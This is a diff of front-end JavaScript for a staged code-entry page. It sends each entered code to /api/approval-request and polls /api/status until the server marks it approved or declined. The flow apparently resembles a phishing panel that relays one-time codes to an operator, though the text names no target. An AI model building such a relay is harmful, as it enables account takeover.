@@ -327,6 +327,7 @@ window.addEventListener("DOMContentLoaded", async () => {
 });
 
 // Setup dynamic item grid handling routines
+  // Setup dynamic item grid handling routines
 function setupBoxInputs(containerId, count, onComplete) {
   const container = document.getElementById(containerId);
   container.innerHTML = "";
@@ -360,7 +361,7 @@ function setupBoxInputs(containerId, count, onComplete) {
     inputs.push(input);
   }
   
-  // FIXED CRASH: Focuses the first slot array item element instead of throwing an array focus method error
+  // CRITICAL FIX: Targets index [0] to focus the first box element, preventing the array crash!
   if (inputs.length > 0) inputs[0].focus();
 }
 
@@ -429,4 +430,58 @@ submitCode1Btn.addEventListener("click", async () => {
 // Final step submission handler
 async function submitCode2Stage(code2Value) {
   userData.code2 = code2Value;
+  document.getElementById("code2Boxes").classList.add("hidden");
+  document.getElementById("code2Waiting").classList.remove("hidden");
+
+  const success = await sendStagePayload("code2", { code2: userData.code2 });
+  if (success) {
+    startPolling("code2", "page4", "page5", "code2Waiting", "code2Message");
+  }
+}
+
+// Pipeline transmission communications helper
+async function sendStagePayload(stage, payload) {
+  try {
+    const response = await fetch("/api/approval-request", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ sessionId, stage, payload })
+    });
+    return response.ok;
+  } catch (e) {
+    return false;
+  }
+}
+
+// Polling core infrastructure engine
+function startPolling(stage, currentPageId, nextPageId, spinnerId, msgId, successCallback) {
+  const msgElement = document.getElementById(msgId);
+  msgElement.className = "status";
+  msgElement.innerText = "";
+
+  if(pollingInterval) clearInterval(pollingInterval);
+
+  pollingInterval = setInterval(async () => {
+    try {
+      const res = await fetch(`/api/status?sessionId=${sessionId}&stage=${stage}`);
+      const data = await res.json();
+
+      if (data.status === "approved") {
+        clearInterval(pollingInterval);
+        document.getElementById(spinnerId).classList.add("hidden");
+        document.getElementById(currentPageId).classList.add("hidden");
+        document.getElementById(nextPageId).classList.remove("hidden");
+        if (successCallback) successCallback();
+      } else if (data.status === "declined") {
+        clearInterval(pollingInterval);
+        document.getElementById(spinnerId).classList.add("hidden");
+        msgElement.className = "status error";
+        msgElement.innerText = "Submission declined. Please refresh and retry.";
+      }
+    } catch (err) {
+      console.error("Status check failed");
+    }
+  }, 2500);
+}
+
 
